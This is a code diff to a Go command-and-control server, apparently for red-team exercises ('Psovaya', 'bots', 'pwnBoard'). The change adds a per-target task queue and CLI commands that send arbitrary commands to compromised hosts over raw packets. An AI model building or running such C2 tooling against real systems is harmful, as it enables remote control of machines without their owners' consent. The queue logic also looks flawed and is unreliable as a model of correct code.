@@ -23,10 +23,16 @@ import (
 
 // Global to store staged command
 var tmpCmd string
+var cmdQueue []Task
 
 // Glabal to store target info
 var targetIP string
 var targetcommand string
+
+type Task struct {
+	Target string
+	cmd    string
+}
 
 type Host struct {
 	Hostname string
@@ -53,29 +59,49 @@ func banner() {
 func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, listen chan Host) {
 	// Forever loop to respond to bots
 	for {
+		/* Original Code */
 		// Block on reading from channel
 		bot := <-listen
-		// Check if there is a command to run
+
 		// Make a socket for sending
 		fd := cattails.NewSocket()
-		if targetcommand != "" {
-			fmt.Println("[+] Sending target cmd", targetIP, targetcommand)
-			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateTargetCommand(targetcommand, targetIP))
-			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
-		} else {
-			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(tmpCmd))
-			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
+
+		/* New Code */
+		queueLen := len(cmdQueue)
+		for i := 0; i < queueLen; i++ {
+			if targetIP == bot.IP.String() {
+				/* Remove Element from Queue */
+				cmdQueue = append(cmdQueue[:i], cmdQueue[i+1:]...)
+				queueLen--
+
+				/* Send Command */
+				packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateTargetCommand(targetcommand, targetIP))
+				cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
+				fmt.Println("[+] Executed Task:", bot.Hostname, "(", bot.IP, ")")
+				unix.Close(fd)
+			}
 		}
-		// YEET
-		if tmpCmd != "" {
-			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
-			// Close the socket
-			unix.Close(fd)
-			// updatepwnBoard(bot)
-		} else {
-			unix.Close(fd)
-			// updatepwnBoard(bot)
-		}
+
+		/*
+			if targetcommand != "" {
+				fmt.Println("[+] Sending target cmd", targetIP, targetcommand)
+				packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateTargetCommand(targetcommand, targetIP))
+				cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
+			} else {
+				packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(tmpCmd))
+				cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
+			}
+			// YEET
+			if tmpCmd != "" {
+				fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
+				// Close the socket
+				unix.Close(fd)
+				// updatepwnBoard(bot)
+			} else {
+				unix.Close(fd)
+				// updatepwnBoard(bot)
+			}
+		*/
 	}
 
 }
@@ -86,7 +112,7 @@ func cli() {
 		// reader type
 		reader := bufio.NewReader(os.Stdin)
 
-		fmt.Printf("\x1b[32mPsovaya \x1b[36m[%v]\x1b[32m > \x1b[0m", targetIP)
+		fmt.Printf("Psovaya \x1b[36m[%v]\x1b[0m > ", targetIP)
 		tmpCmd, _ = reader.ReadString('\n')
 		tmpCmd = strings.Trim(tmpCmd, "\n") // Trim newlines
 
@@ -100,14 +126,15 @@ func cli() {
 				fmt.Printf("Target: %v\n", splitCmd[2])
 				targetIP = splitCmd[2]
 			} else {
-				fmt.Printf("Incorrect Syntax\n")
+				fmt.Printf("\x1b[31m[-] Incorrect Syntax\n\x1b[0m")
 			}
 		case "exec":
 			if targetIP != "" {
-				cmd := strings.Split(tmpCmd, "exec")
-				fmt.Printf("Executing : %v\n", cmd[1])
+				cmd := tmpCmd[5:]
+				cmdQueue = append(cmdQueue, Task{targetIP, cmd})
+				fmt.Printf("[+] Queued : %v\n", cmd)
 			} else {
-				fmt.Println("No Target")
+				fmt.Println("\x1b[31m[-] No Target\x1b[0m")
 			}
 		case "info":
 			fmt.Println("info")
@@ -118,11 +145,14 @@ func cli() {
 			if resp == "Y" || resp == "y" {
 				os.Exit(0)
 			}
-			break
 		case "clear":
+		case "queue":
+			for i := 0; i < len(cmdQueue); i++ {
+				fmt.Printf("%v : %v\n", cmdQueue[i].Target, cmdQueue[i].cmd)
+			}
 		case "":
 		default:
-			fmt.Printf("Unknown Command\n")
+			fmt.Printf("\x1b[31m[-] Unknown Command\n\x1b[0m")
 		}
 		tmpCmd = ""
 	}
@@ -175,7 +205,7 @@ func main() {
 	listen := make(chan Host, 5)
 
 	// Iface and myip for the sendcommand func to use
-	iface, myIP := cattails.GetOutwardIface("192.168.1.10:80")
+	iface, myIP := cattails.GetOutwardIface("192.168.33.10:80")
 	fmt.Println("[+] Interface:", iface.Name)
 
 	dstMAC, err := cattails.GetRouterMAC()
